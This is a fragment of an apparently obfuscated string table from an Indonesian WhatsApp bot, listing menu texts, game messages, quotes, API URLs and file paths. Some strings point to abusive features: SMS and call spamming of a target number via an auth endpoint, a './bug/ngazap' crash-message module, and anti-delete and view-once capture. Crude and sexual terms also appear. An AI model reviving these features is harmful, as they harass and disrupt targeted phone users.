BtH5O+IO6TiU+yihqaTgevfpEtmtqtQZLgAAIR3L9O+TifZ4def4POT5iWeY2mGHG++EAXRMxttHgPPDmHMjP/tI4HZTXZO1kzRDDzhaFMp1Swhe9iZIBF42GknxwPjngvh7hvJmlc4u5guPZSnQYjWv3ZA+PUeeNJ4drVM8It1eYsLDlA24hwKSFueykG83MCJ8ZxRuHs8zPiWvzF/7oo8wp3XQ243UtgIaQJgSTYXNwCesYDZE6GS42EKo7dUz/GOqSyaZ2FU2vVYC07dcaJ9p2X8PUiKdeVvAV4Oh2mZVzUN2PU3mY36dMZ4VKNM/CnjDk/hCNxvgHbhU7DXd/wBsfib263tjlN3qp8EALG0Kv8+uI8MtqTYmD6YKwy2gruNv90YexWxo/wBneeU2RO5g8+HF1a2S3TlQCxqN4N7CUDbzwHgziityDNFv8pyopnTodSo2WBMHyI/cjralMqabS4F6DqUNiAdwcP15sSXDpaC5CwoBHdIsI+HrhbB02Ku4r4UKu2nLg5WqIWJpWyvmdCbxIgX8seybi/hx7I6TK32Xi1SsNtnmtIPuIgGyj4Yx13Mg9oaLNOA0lxHupvr3JP8A7kjwwmmzYMgKQwyi0RCPn6i/z9MGxLU6ri+joeGF5fkzFY3UrJWFcrQgFbnMWAuZ6kD4Yq+S8dcQ5fXO1Dz7tUgAgtPqLgg/H0OKs3XNtPU8Ms2d5l1Aj4g2Px+gwVGcBoVHsKUh0EkAJ7np4H9sLS1olfx5TvcIVNEKaoTX1RUdSWQG4W5rX1kWJ8cZoxWV1JllTTslxuneVodB2UJ2I2O/1wb72S2kamKZxZ0XIRM/xN/jgNbWtVLHLLVOJT7wIPWfXqf+RBolNalS1PNFbiyYtrVPT6YUXOWy+rUUS5Ez5jzviOdZISP7fxsoTjymwG55bJJ/7ttsPpeT2fqU2AxCnbC0teXS18DZda7TUD2gEe8GgfmMENPBY0FZkfmjp9MERS0/MdLbzxcgSAqDM/XBbCtkArHWpQQokF0bMRgvNTpN3LXg082jHqto60IQagjmW1wd/D5YMQ4lCP7jupgaVCMBGKmwqrQZdnV+nB69IwbRFRUEVCx3Ru0Z9w9Iwl5xSa5q65W5BuJ+fzwRDbwqKghTq3NIBMjwO/ywbT2hoD3MaLbzjg8Q0T09McU4S3UFx51ZiPwYHxtg9NVPNOtlCyJVfvX6Y9zVhD+h1aCN/aDY74JommFWpPLprOR6bWG1r4LT8ssrC1LbBcJu2fLwH0x6sqFt8jlkweuoeA6dMKRVu8l3WHCOZ+oPLfxOH2fYi+QXWhzptuGiD/jHlNNFh+axYHM/RJBuOsWw1qFKdcaLiXNZTfU4P5tji57M7PNnVeXB4jpgwfX+v//Z', '\x0a ┊ Buyer : Admin\x0a ┊ Price/Fish : 5\x0a ┊ Status : Success\x0a ┊ Left FishPrice/Fish : ', 'Set proses already active', 'cekpremium', 'welcome', 'List respon dengan key : *', 'Cherrytown', 'days', ' sedang afk\x0aAlasan : ', '\x0a\x0aKirim perintah .caklontong untuk bermain lagi 🎮', 'silk-text', ' SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH', 'watercolor', 'stickergif', 'simp', ' 1*2', 'translation_en', 'ping', 'Fitur Khusus owner!', '80 Bulan Lagi', '\x0a*• Koordinat :* ', 'Masukkan nominal nya!', 'image', '82% wihh Kakak Pasti Sering Perawatan kan??', ' Halo @user, Selamat datang di @group', 'imageeffect', 'locked', 'broken', 'balancemenu', 'Huthwaite', '97% Assalamualaikum Ukhty🐊', './datanya/anime/ana', 'kick', '\x0a*• Datetime :* ', 'addaud', '*Misi kill Behemoth*\x0a\x0a🎁 *Hadiah untuk kiling Behemoth*\x0a ┊ *Money:* $', '.teli', 'autoaipc', 'gemb', 'GrandLegends 忍³', 'Arkkukari', 'lk21', 'Tolong jangan pergi saat aku sudah sangat sayang padamu', 'Coba kamu yang berada diposisiku, lalu kamu ditinggalin gitu aja sama orang yang lo sayang banget', 'Master ✯✯✯', 'https://api.zeeoneofc.my.id/api/telegram-sticker/', '*love-message (Text)*\x0a│47 ▸ ', 'bocil', 'numberOfAyah', 'Nih asupan guys 😋', 'Avalanche', '#user-page > div.user > div.row > div > div.user__img', 'tega', '*🐟Fish* : ', 'covergraffiti', 'Murlayfield', '╭─▸ *LIST LOGO*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *tiger*\x0a│2 ▸ *shark*\x0a│3 ▸ *dugong*\x0a│4 ▸ *bull*\x0a│5 ▸ *cheetah*\x0a│6 ▸ *lion*\x0a│\x0a╰────────────˧', 'Belum ada list message di database', 'jualkayu', 'spam sms/call akan di kirim ke no target', '.mp4', 'glass8', '-af atempo=4/4,asetrate=44500*2/3', '* @tag nominal', 'Satu aja emojinya', '16002850FqqaDp', '#changewelcome', 'neko_gif', '\x0avDeskripsi : ', 'ephoto360menu', '* batu dan ', './datanya/anime/yuki', 'status', 'confess', 'pin', 'deep', 'groupFetchAllParticipating', '*Judul:* ', 'ytdl-core', '*flaming (Text)*\x0a│22 ▸ ', 'Sukses set list message dengan key : *', ' Information*_\x0a\x0a*• Name :* ', 'fetchStatus', 'wanted', 'coffecup', 'writeblood', 'ownerName', './lib/antispam', ';;;\x0aFN:', 'translate', 'Fitur Khusus Di private chat!', 'duration', ' *kode bahasa*\x0a• Contoh : ', 'Yang sendiri adalah yang bersabar menunggu pasangan sejatinya', 'map', 'jam', 'Peraturan Penggunaan Bot :\x0a- Dilarang Spam\x0a- Dilarang Menelpon Bot\x0a- Dilarang Mengirim Virus Ke Bot\x0a\x0aCatatan :\x0aSemua Fitur Bot Di Lakukan Secara Otomatis Oleh Sistem Tanpa Ada Campur Tangan Owner, Dan Semua Informasimu Seperti Chat, Foto, Video Atau Vn Akan Aman Tanpa Di Sebar, Dan Jika Ada Balasan Yang Absurd Atau Sticker Absurd Ya Mungkin Owner Lagi Gabut Dan Butuh Temen Chat :v', 'liriklagu', 'w:profile:picture', ' *@tag nominal*\x0a\x0aContoh : ', 'Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu', 'patrick', 'Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku', 'charAt', 'Lu Siapa Kocak?', 'Silver 3', 'stikermeme', 'yts', 'antiDelete', 'revoke', 'jimin', '*🐑Sheep* : ', '#stalkingmenu', 'fanart', 'tesuka', 'simi', 'apikey sedang eror', 'toimage', 'Memek', 'Anjay', 'Tidak bisa spam ke nomor ini!', ' Already on the Banned list !!', 'updatelist', 'Halo Kak Untuk Pembayaran Bisa Scan Qr Tersebut Atau Bisa Dengan Pembayaran Lain Silahkan Hubungi Owner', 'quoted', 'statusText', 'boruto', 'protocolMessage', '.webp', 'videoCount', './database/commandUser.json', 'underwater-ocean', 'demote', '╭─▸ *LIST COLOR*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *gold*\x0a│2 ▸ *green-blue*\x0a│3 ▸ *green-yellow*\x0a│4 ▸ *pink-yellow*\x0a│5 ▸ *cyan-purple*\x0a│6 ▸ *orange-red*\x0a│\x0a╰────────────˧', ' 🎮\x0a\x0aJawaban Benar 🎉\x0a+$', 'video_sd', 'Pilson Meadow', 'joingc', 'result', 'Gunakan dengan cara ', 'https://telegra.ph/file/dbecd2f871988f52bf555.jpg', 'tits', 'Limit game kamu sudah habis', 'Diamond 5', 'description', 'Bredwardine', 'Legends 10', '\x0a*Sisa sapi* : ', 'ShinoKey', 'Reply Pesan!', 'application/pdf', 'cekgay', '\x0a\x0a\x0a-By ', 'Masukkan Juznya\x0aContoh : ', 'Gambar diatas adalah bendera negara?\x0a\x0aWaktu : ', '*scary-cemetery (Text)*\x0a│8 ▸ ', 'https://api.zeeoneofc.my.id/api/canvas/', './database/kickme.json', 'Skargness', 'bcsticker', '\x0a*Selama :* ', 'Belum ada set left di sini..', 'tolakmenfes', 'tictactoe', 'banneroflol', 'Fitur Khusus Group!', 'info', '*Misi kill DemonKing*\x0a\x0a🎁 *DemonKing Kill Reward*\x0a ┊ *Money* : $', '3️⃣', 'Claethorpes', 'Lu di ban kocak awokwok', '#delsetclose', 'unbanneduser', 'axios', '50% abang Ganteng deh><', ', maka kirim pesan ', 'gcount', 'Llanybydder', '9NCNWtV', '35 Hari Lagi', '*https://wa.me/settings*\x0a𝙅𝙪𝙣𝙖𝘽𝙤𝙩-𝙈𝙙 ', 'AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==', 'Blackburn', ' AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ', 'Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu', 'capercut', '\x0a*Sejak :* ', '\x0a*Sisa emas* : ', 'terjual', '.ytega', 'Larnwick', '\x0aAsal : ', 'moderngold2', '.json', 'Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina', '#group', 'Done Sayang >///<', 'author', '\x0aTeks Latin : ', 'Nsfw berhasil di nonaktifkan di group ini', 'Tebak Kalimat', 'https://skizo.tech/api/toanime?url=', 'delsetleft', 'lightningpubg', 'webp', '.jpeg', 'totalAyah', 'perf_hooks', 'Volcanic Eruption', '\x0a🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛\x0a⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛\x0a⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛\x0a🏘️🏘️🏘️🏘️🌳  🌳 🏘️       \x0a\x0a\x0a➕ Mengantar ke tujuan....\x0a', '*Name :* ', 'Done?', 'tebaksiapa', ' minute(s) ', 'cowokasiamenu', 'postig', 'akiyama', '╭─▸ *LIST CHARACTER*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *caulifla*\x0a│2 ▸ *cooler*\x0a│3 ▸ *cumber*\x0a│4 ▸ *hit*\x0a│5 ▸ *kale*\x0a│6 ▸ *kaminoren*\x0a│7 ▸ *gokuui*\x0a│8 ▸ *xenogokuss3*\x0a│9 ▸ *xenogokuss4*\x0a│10 ▸ *xenovegeta*\x0a│11 ▸ *xenovegito*\x0a│12 ▸ *android-18*\x0a│13 ▸ *blackgoku*\x0a│14 ▸ *bulma*\x0a│15 ▸ *frieza*\x0a│16 ▸ *gotenks-2*\x0a│17 ▸ *kaio*\x0a│18 ▸ *krillinandroid-18*\x0a│19 ▸ *launch*\x0a│20 ▸ *nutenroshi-2*\x0a│21 ▸ *oldkai*\x0a│22 ▸ *oolong*\x0a│23 ▸ *pilaf*\x0a│24 ▸ *tienshinhan*\x0a│25 ▸ *trunks-3*\x0a│26 ▸ *bardock*\x0a│27 ▸ *gotenks*\x0a│28 ▸ *nutenroshi*\x0a│29 ▸ *piccolo*\x0a│30 ▸ *songoku-2*\x0a│31 ▸ *songoku-3*\x0a│32 ▸ *songoten*\x0a│33 ▸ *trunks-2*\x0a│34 ▸ *vegeta-2*\x0a│35 ▸ *vegito*\x0a│36 ▸ *krillin*\x0a│37 ▸ *najinbuu*\x0a│38 ▸ *songohan*\x0a│39 ▸ *songoku*\x0a│40 ▸ *trunks*\x0a│41 ▸ *vegeta*\x0a│\x0a╰────────────˧', './datanya/anime/rize', 'model_version', '𝐂𝐡𝐚𝐢𝐤𝐚𝐥𝐎𝐟𝐟𝐜', './media/podcast/1.mp3', '\x0a*Terjual:* ', 'isSupported', 'minato', 'Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\x0a\x0a', ' *angka* / *angka*\x0a\x0a_Contoh_\x0a\x0a', 'Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia', 'Peatsland', 'spotifydl', 'downloadAndSaveMediaMessage', 'demonking', 'Kirim perintah:\x0a', './lib/setdone', 'lintang', 'snippet', 'kimminseok', 'groupRevokeInvite', '#antidelete', 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=', 'whatsapp.com', 'Beggar’s Hole', 'aura', '\x0a༫ Owner Group : @', 'Posisi Invalid', 'addvideo', 'christmascard', 'instagramsilver', 'Dia bukan owner', 'https://api.zahwazein.xyz/randomtext/dilanquote?apikey=', 'ngojek', 'getSewaPosition', '\x0aTeks Arab : ', './datanya/anime/akira', ' id halo\x0aDaftar bahasa yang di dukung : https://cloud.google.com/translate/docs/languages', 'listfbgamepubgcover', 'Mansfield', 'effect3donbeach', '*battlefield4 (Text1) | (Text2)*\x0a│56 ▸ ', 'play', 'delsetopen', '.teteb', 'spotifysearch', 'https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json', 'balance @tag untuk mengecek Balance lawanmu', '*List Premium User*\x0aJumlah : ', 'Anda Tidak Memiliki Cukup Sapi Untuk Transaksi Ini', 'goodbye', 'link', 'Masukan nama lu yang bener cok\x0a contoh: ', 'stringify', 'inventory', '*crisp (Text)* \x0a│21 ▸ ', '* kayu', 'server eror', 'Astrakhan', 'text', './lib/afk', '*「 WA ME DETECTOR 」*\x0a\x0aSepertinya kamu mengirimkan link Whatsapp, maaf kamu akan di kick', 'Done', 'viewOnceMessageV2', '\x0aTidak Terdaftar\x0a', '*Jawablah Pertanyaan Berikut :*\x0aSoal : ', 'sort', 'Sukses ubah set done!', 'Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar', '75 Bulan Lagi', 'goplanet', '\x0a\x0aKirim perintah .tebakkata untuk bermain lagi 🎮', 'close', 'Kilerth', 'load', './datanya/anime/loli', 'https://telegra.ph/file/66435cf783e308b19927e.jpg', '*BROADCAST*\x0a\x0a', 'Tag/reply pesan target yang ingin di kick!', 'glossy', 'Terjadi kesalahan saat mencari aplikasi.', 'Anda Tidak Punya Ramuan, Coba Beli Dengan Cara #buypotion _amount_', 'save', '* selama 2 tahun', '\x0aArti Dalam Bahasa Indonesia : ', 'pubgmascotlogo', './database/closegc.json', 'getCode', '* batu dan *', 'subject', '.ytelo', 'kurang', 'Tobat Broo:v', 'tomp3', 'grupwa', './database/respon.json', '#randomsticker', 'killdevil', 'ephotomenu', '.teki', 'halloween', 'sparkling3', 'jsdom', 'graffititext2', 'oscar', 'summer-text', 'pochinki', 'iron', '39% Lebih Semangat🐊', 'jpm', 'Donate 💰', 'Unlimited', '1000', '\x0a│ • *Saweria:* ', 'youtube.com|youtu.be', './media/podcast/7.mp3', 'Partner ditemukan!', ' kepada bot', ' Jam ', 'neko_sfw', 'Belum ada list message yang terdaftar di group ini', 'delowner', 'mining', '_*Kisah Nabi*_\x0aNama Nabi : ', 'time_processing', 'base64', 'covergamepubg', 'embossed', 'autoread', '*quotes-undergrass (Text)*\x0a│45 ▸ ', 'Done Awokwok', 'listvideo', '*「 LEBUR BERHASIL 」*\x0a\x0a*Jumlah Ore dilebur :* ', '97% Assalamualaikum Ganteng🐊', 'https://api.nomisec07.site/api/komikcast-search?query=', './datanya/anime/miku', '*AUDIO LIST :*\x0a\x0a', '&banner=', 'yana', 'denim', 'Erostey', 'Pella’s', '.vyro', 'decorate', 'setAt', '100% Kakak Pake Susuk ya??:v', 'stickermeme', 'unblok', '#photooxymenu', 'podcast', 'linkwa', 'Hasil pencarian dari ', 'exports', 'gif', 'broadcast', 'islammenu', 'realembroidery', 'quotesanime', './database/opengc.json', 'character', 'Penshaw', 'nsfw', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36', 'https://skizo.tech/api/openai?text=', 'megumin', 'Gilramore', '*LIST-SEWA-GROUP*\x0a\x0a*Total:* ', 'indexOf', '*Sisa bahankimia:* ', 'https://api.zahwazein.xyz/randomtext/jawaquote?apikey=', 'Pierced by a thorn while hunting', 'photooxymenu', '\x0aJawaban : ', '*textoncup2 (Text)*\x0a│48 ▸ ', 'slice', '*quote-wood (Text)*\x0a│44 ▸ ', 'joinrpg', 'chrismast', 'glitch2', 'not_announcement', 'bagaimanakah', 'Cari Partner', 'GrandMaster ✯✯', '(async () => { return ', 'Sorry this video can\'t be download\x0a\x0a*Please Report Owner!*', 'https://api.zahwazein.xyz/information/bmkg/gempa?apikey=', 'toLowerCase', 'kagura', '3dchrome', '\x0a ┊ *Gold*: ', '*SUCCESFUL ✅*', '\x0a❏──────────────๑\x0a\x0aTerima Kasih Yang Sudah Donasi, Berapapun Donasi Kamu Akan Sangat Saya Hargain >,<', 'Berhasil mengganti pp group', '#mainmenu', 'kosong', 'Iya kak?', 'Asia/Kolkata', 'Sorry this video can\'t be download\x0a\x0aRequest failed with status code *400*', 'Maksimal 10 detik!', '95 Hari Lagi', 'setname', './media/sadpodcast/4.mp3', 'detik', '#mediafire', '@s.whatsapp.net', '#randomanime', 'ttete', 'Platinum 3', 'female', 'Menunggu partner', '*STICKER LIST :*\x0a\x0a', '60000', 'gradient', 'syania', '/zipball', 'https://telegra.ph/file/16857796fab2ccb6cffc2.jpg', 'ytv', 'Perintah ini hanya bisa dilakukan di Grup yang menyewa bot', 'bear', 'https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json', 'Example ', '.tete', 'voters', 'Oakheart', 'pubglogomaker', 'lava', ' *query*\x0a\x0a_Contoh_\x0a\x0a', 'Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri', 'now', 'openai', 'sparkling2', 'Sukses delete set left', 'santet', 'Udah nonaktif', '.mp3', 'blackpink', 'pollUpdates', 'tebakbendera', 'komikusearch', '╭─▸ *LIST BACKGROUND*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *cobra*\x0a│2 ▸ *dragon*\x0a│3 ▸ *eagle*\x0a│4 ▸ *eagle2*\x0a│5 ▸ *falcon*\x0a│6 ▸ *bear*\x0a│7 ▸ *lion*\x0a│8 ▸ *lion2*\x0a│9 ▸ *buffalo*\x0a│10 ▸ *tiger*\x0a│11 ▸ *tiger2*\x0a│12 ▸ *wolf*\x0a│\x0a╰────────────˧', 'Sukses bc ke ', 'node-gtts', 'developer', 'Northwich', 'video', 'max', 'desc', 'posts', 'listpencilsketch', '*\x0a\x0a_Untuk mengambil sticker silahkan kirim pesan sesuai list stiker di atas_', '\x0a\x0a────────────────────────\x0a\x0a', '#storagemenu', ' id gc\x0aContoh ', '\x0a\x0aKirim perintah .tete untuk bantuan dan .ytete untuk menyerah 🎮', 'Mau sewa bot buat jaga gc? silahkan hubungi owner', 'youtu.be', '*VIDEO LIST :*\x0a\x0a', 'Master ✯', 'facebooksilver', 'Willow Field', '\x0a*Rating:* ', '👨👩 Teman chat kamu memberikan kontak profil nya!', 'graffiti-cover', 'liststiker', ' ore kamu belum cukup, minimal 2 ore', 'Maaf, untuk key *', ' *angka* * *angka*\x0a\x0a_Contoh_\x0a\x0a', 'shota', 'tourl', 'google-it', 'updateBlockStatus', 'off', '30 Hari Lagi', 'listcompanylogo', '╭─▸ *LIST ICON*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *bird*\x0a│2 ▸ *butterfly*\x0a│3 ▸ *coffee*\x0a│4 ▸ *dove*\x0a│5 ▸ *leaf*\x0a│6 ▸ *like*\x0a│7 ▸ *lotus*\x0a│8 ▸ *milk-tea*\x0a│9 ▸ *panda*\x0a│10 ▸ *tree*\x0a│11 ▸ *woman*\x0a│12 ▸ *bear*\x0a│13 ▸ *bull*\x0a│14 ▸ *dragon*\x0a│15 ▸ *eagle*\x0a│16 ▸ *hawk*\x0a│17 ▸ *ninja*\x0a│18 ▸ *paw*\x0a│19 ▸ *rooster*\x0a│20 ▸ *sabertooth*\x0a│21 ▸ *skull*\x0a│22 ▸ *warrior*\x0a│23 ▸ *zebra*\x0a│\x0a╰────────────˧', '\x0aitem1.X-ABLabel:Ponsel\x0aEND:VCARD', 'womansday', './bug/ngazap', 'Nih kak foto ', 'Cardend', 'uptime', '*Artis:* ', 'Verona Lush', '166659839399999', 'listpremium', './lib/setopen', '\x0aSisa Game Limit : ', 'glass5', 'engraved', 'Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa', 'listeffect3donbeach', '_*Lemahh Gitu Doang Nyerah*_ 😏', ' .. kamu percaya sama aku ? aaaaaaaaaaah syukur ', 'embroidery', 'Dahlah Nyerah Aja✌️', 'latin', 'magnitude', 'Harusnya kalo udah ga sayang sama aku tu bilang aja gausa di tutup tutupin\x0a*BY INDI*', 'https://telegra.ph/file/a4ec01498e764ae42c8c4.jpg', 'Limit Sudah Di Reset!', 'yuri', 'royallook', '20% Semangat Ya Kaka👍', 'hunt', 'Sakit itu ketika cinta yang aku beri tidak kamu hargai', './media/sound/oy.mp3', 'Hi ', ' whatsapp', 'meta', 'https://telegra.ph/file/1777e972a6ea790afebfc.mp4', '#autoaijapri', './database/nsfw.json', 'Sukses delete set close', '*burn-paper (Text)*\x0a│49 ▸ ', '\x0a\x0aKirim perintah .tebaksiapa untuk bermain lagi 🎮', 'https://telegra.ph/file/0c3fa86f57a4f6d9c4c0e.jpg', '#antiwame2', 'block', 'marvel2', 'listbannerofaov', ' telah menerima menfess kamu, sekarang kamu bisa chat lewat bot ini_\x0a\x0a*NOTE :*\x0aJika ingin berhenti dari menfess, silahkan ketik .stopmenfess', 'searchmenu', 'banuser', 'banneduser', 'Bisa Jadi', 'Rasanya baru kemarin kamu menawariku seblak. Lalu entah mengapa hari ini menanyakan kabar pun tidak.\x0a~vinaa', '\x0a*Developer:* ', 'Wish', ' ]—*\x0a ➕ 💹 Uang = [ ', 'watchFile', 'quotes', 'Balas pesannya', 'audioonly', 'kuriyama', 'stone', 'unlinkSync', 'media.mp4', '.leave', 'balloon2', './database/user/rpg.js', 'linkgrup', './database/user/alat_tukar.js', 'fbdl', 'marvel', 'instagram-url-direct', '🎰 Casino Game 💰\x0a\x0a• @', 'wa.me/', 'tebakkimia', 'holo', 'GrandLegends 3', 'google', '0@s.whatsapp.net', '\x0a*Sisa besi* : ', '\x0a\x0aKirim perintah .teteb untuk bantuan dan .yteteb untuk menyerah 🎮', '212', '#changeopen', 'https://telegra.ph/file/19a10ff95c31af10267e4.jpg', 'topglobal', '\x0a🚀 Diupload ', 'bunga', 'vidToSticker', 'unsur', 'resolve', 'Bugg Cuyy Awokwok😱', 'nuliskiri\x0a2. ', '\x0a*Sisa zamrud* : ', 'finish', 'Nama : ', 'inori', 'Platinum 5', 'Couple Male', 'mp3', 'lisa', 'elaina', '2 Tahun Lagi', 'https://api.nomisec07.site/api/spotify?url=', '&thumb=', 'green', 'Udah aktif', 'Boca Roca', 'Sukses menyetel tautan undangan grup ini', 'ceil', './media/sound/ajojing.mp3', 'https://www.google.com/search?q=', '\"ahri-2\",\x0a\"neeko\",\x0a\"nocturne\",\x0a\"shen-2\",\x0a\"veigar\",\x0a\"rakanayah-2\",\x0a\"zoe-2\",\x0a\"pantheon-2\",\x0a\"rammus\",\x0a\"udyr\",\x0a\"darius-2\",\x0a\"ekko-2\",\x0a\"lablanc\",\x0a\"leona\",\x0a\"nissfotune\",\x0a\"poppy\",\x0a\"quinn\",\x0a\"talon-2\",\x0a\"akali-2\",\x0a\"irelia-2\",\x0a\"jinx-2\",\x0a\"nordekaiser\",\x0a\"pyke-2\",\x0a\"renekton\",\x0a\"rengar\",\x0a\"sivir\",\x0a\"sona\",\x0a\"soraka\",\x0a\"tristana\",\x0a\"warwick\",\x0a\"yuumi\",\x0a\"ziggs\",\x0a\"leesin\",\x0a\"lulu\",\x0a\"lux\",\x0a\"naster-yi\",\x0a\"norgana\",\x0a\"nasus\",\x0a\"pantheon\",\x0a\"pyke\",\x0a\"qiyana\",\x0a\"rakan\",\x0a\"rakanxayah\",\x0a\"riven\",\x0a\"shen\",\x0a\"sylas\",\x0a\"talon\",\x0a\"teemo\",\x0a\"thresh\",\x0a\"tryndamere\",\x0a\"varus\",\x0a\"vayne\",\x0a\"velkoz\",\x0a\"vladimir\",\x0a\"yasuo\",\x0a\"zed\",\x0a\"zoe\",\x0a\"hecarim\",\x0a\"heimerdinger\",\x0a\"illaoi\",\x0a\"irelia\",\x0a\"ivern\",\x0a\"janna\",\x0a\"jarvan-iv\",\x0a\"jax\",\x0a\"jayce\",\x0a\"jhin\",\x0a\"jinx\",\x0a\"kaisa\",\x0a\"kalista\",\x0a\"karma\",\x0a\"karthus\",\x0a\"kassadin\",\x0a\"katarina\",\x0a\"kayle\",\x0a\"kayn\",\x0a\"kennen\",\x0a\"khazix\",\x0a\"kindred\",\x0a\"kled\",\x0a\"kogmaw\",\x0a\"aatrox\",\x0a\"ahri\",\x0a\"akali\",\x0a\"alistar\",\x0a\"amumu\",\x0a\"anivia\",\x0a\"annie\",\x0a\"ashe\",\x0a\"aurelionsol\",\x0a\"azir\",\x0a\"bard\",\x0a\"blitzcrank\",\x0a\"brand\",\x0a\"braum\",\x0a\"caitlyn\",\x0a\"camille\",\x0a\"cassiopeia\",\x0a\"chogath\",\x0a\"corki\",\x0a\"darius\",\x0a\"diana\",\x0a\"drmundo\",\x0a\"draven\",\x0a\"ekko\",\x0a\"elise\",\x0a\"evelynn\",\x0a\"ezreal\",\x0a\"fiddlesticks\",\x0a\"fiora\",\x0a\"fizz\",\x0a\"galio\",\x0a\"gangplank\",\x0a\"garen\",\x0a\"gnar\",\x0a\"gragas\",\x0a\"graves\"', 'Hint', 'pokemon', 'Upss error silahkan hubungi owner agar di fix', '👤 Owner', 'totalGb', 'Limit kamu sudah habis silahkan kirim ', '#cowokasiamenu', '\x0aArti Dalam Bahasa Inggris : ', '#infobot', 'TENTU PASTI KAMU BISA!!!!', 'Created By ', 'feet', 'Sukses delete set open', 'Wolford', 'https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json', 'Balas video atau voice note yang ingin diubah ke mp3 dengan caption *', 'youtubegold', '#asupanmenu', 'magma', 'sellemas', 'setppbot2', 'Anda Tidak Memiliki Cukup Ikan Untuk Transaksi Ini', ' berhasil\x0a\x0aSisa Balance : $', '\x0aあ Upload : ', 'icetext', 'Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan', 'cantikcek', '\x0aあ URL Video : ', '\x0a😎 Views : ', 'Sedang meroket 😱, silahkan tunggu... 2 tahun', 'neon', 'genshin', 'buylimit', 'mars', 'berry', 'Legends 5', './datanya/anime/gremory', 'kimjong', '_Maaf Kak, Kalau Hasilnya Nggak Bagus_ T_T', 'kotori', './datanya/anime/tomori', '\x0aあ Channel : ', './datanya/anime/kosaki', ' jam, ', 'bcimg', 'bdsm', '\x0a*Total : ', 'Sorry this video can\'t be download\x0a\x0aRequest failed with status code *404*', ' keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ', 'sasuke', 'Bronze 1', '*Uang didapat:* ', './lib/uploader', 'jewelry3', 'Pembeliaan game limit sebanyak ', './lib/sewa', ' *angka* + *angka*\x0a\x0a_Contoh_\x0a\x0a', ' WIB\x0a\x0a⌞ ʟɪɴᴋ ɢʀᴏᴜᴘ ⌝\x0ahttps://chat.whatsapp.com/', 'Emmm anu om, error hehe:v', 'Anda Tidak Memiliki Cukup Gajah Untuk Transaksi Ini', '*furtext (Text)*\x0a│23 ▸ ', 'Owhh Begitu:(', '*embroidery (Text)*\x0a│20 ▸ ', '✅ Done set open!', '\x0a\x0aTerdapat *', 'menjamet', '\x0a\x0aKirim perintah .susunkata untuk bermain lagi 🎮', 'auto_leaveMsg', 'blob', 'https://api.myfave.com/api/fave/v1/auth', 'Jedburgh', '💳 Limit : ', 'profilePictureUrl', 'Asia/Jakarta', 'troligc', '*butterfly-reflection (Text)*\x0a│14 ▸ ', 'listmascotstyle', './database/sewa.json', ' Pesanan sedang di proses ya @user\x0a\x0a- @user (tag org yg pesan)\x0a- @pesanan (pesanan)\x0a- @jam (waktu pemesanan)\x0a- @tanggal (tanggal pemesanan) ', 'Legends 2', '\x0a⏱️ Durasi : ', 'Soal ini belum selesai', 'audio/mpeg', 'aipc', 'baekhyung', 'participants', '#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)', 'Bradford', 'Udah on', 'corbiens river', 'asupan', ' Indonesia', '\x0a*• Prefix :* ', 'thighs', '0ཻུ۪۪ꦽꦼ̷⸙‹•══════════════♡᭄\x0a│       \x0a╰═════ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙\x0a', 'groupLeave', 'messageTimestamp', 'wolf-metal', 'Blue Field', 'https://api.zahwazein.xyz/randomimage/darkjoke?apikey=', 'typography-flower', 'anonymousmenu', 'Reply pesanan yang telah di proses', 'https://api.zeeoneofc.my.id/api/photooxy/', ' *teks_left*\x0a\x0a_Contoh_\x0a\x0a', 'icon', ' tidak ditemukan', 'Sukses ubah set close teks!', 'Successfully Disabling antilink2 In This Group', 'Mencari Pelanggan...', 'OnlyPrem', 'cekdrive', 'human-readable', 'fetchBlocklist', '|6292818802718|Menfes nih\x0a', './datanya/anime/kaori', 'Success Add Sewa Group Berwaktu!', 'img', 'peak', 'juice', ' tes|apa', 'Gak Bisa', 'decorate2', 'Tropical forest', '🎰 *Lucky*\x0a┊ *Money:* $', ' baitfood', 'graffititext3', 'dirasakan', 'Green Oasis', 'cekprem', 'Mau yang berapa hari?', 'reSize', 'Platinum 1', 'Mau buy apa lu?\x0a\x0a1.potion\x0a2.baitfood\x0a3.limit\x0a\x0aExample: ', 'simplemenu', '╭─▸ *LIST BACKGROUND*\x0a│\x0a├❖ *LIST*\x0a│1 ▸ *bg1*\x0a│2 ▸ *bg2*\x0a│3 ▸ *bg3*\x0a│4 ▸ *bg4*\x0a│5 ▸ *bg5*\x0a│6 ▸ *bg6*\x0a│\x0a╰────────────˧', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36', '*bevel-text (Text)*\x0a│4 